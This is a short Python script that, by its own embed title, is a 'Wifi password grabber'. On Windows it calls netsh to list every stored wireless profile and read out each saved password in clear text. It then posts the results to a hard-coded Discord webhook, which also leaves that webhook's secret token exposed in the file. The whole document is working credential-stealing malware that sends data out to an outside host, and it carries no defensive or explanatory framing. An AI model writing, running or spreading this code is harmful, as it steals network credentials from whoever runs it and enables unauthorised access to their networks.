
import subprocess
import re
import requests
import time

WEBHOOK_URL = "https://discord.com/api/webhooks/1377146230748217487/ndJ-RPcmAJ3RnyWONEoAPFkRi4qwvDbUW3WHyaRuoL_DYvqYJwNbDt3hVwKNldKlLj-6"

def get_wifi_profiles():
    profiles = []
    try:
        output = subprocess.check_output('netsh wlan show profiles', shell=True, text=True, encoding='utf-8')
        profiles = re.findall(r"All User Profile     : (.*)", output)
    except Exception as e:
        return [f"Error getting profiles: {e}"]
    return profiles

def get_wifi_password(profile):
    try:
        output = subprocess.check_output(f'netsh wlan show profile name="{profile}" key=clear', shell=True, text=True, encoding='utf-8')
        password_search = re.search(r"Key Content            : (.*)", output)
        if password_search:
            return password_search.group(1)
        else:
            return "(No Password Found)"
    except Exception as e:
        return f"Error: {e}"

def send_to_webhook(content):
    embed = {
        "title": "Wifi password grabber",
        "description": content,
        "color": 0x00FF00,
        "footer": {
            "text": "Sent at " + time.strftime("%Y-%m-%d %H:%M:%S")
        }
    }
    data = {"embeds": [embed]}
    try:
        requests.post(WEBHOOK_URL, json=data)
    except:
        pass

if __name__ == "__main__":
    profiles = get_wifi_profiles()
    if isinstance(profiles, list) and profiles and not profiles[0].startswith("Error"):
        message = ""
        for profile in profiles:
            pwd = get_wifi_password(profile)
            message += f"**{profile}** : `{pwd}`\n"
    else:
        message = "\n".join(profiles)
    send_to_webhook(message)
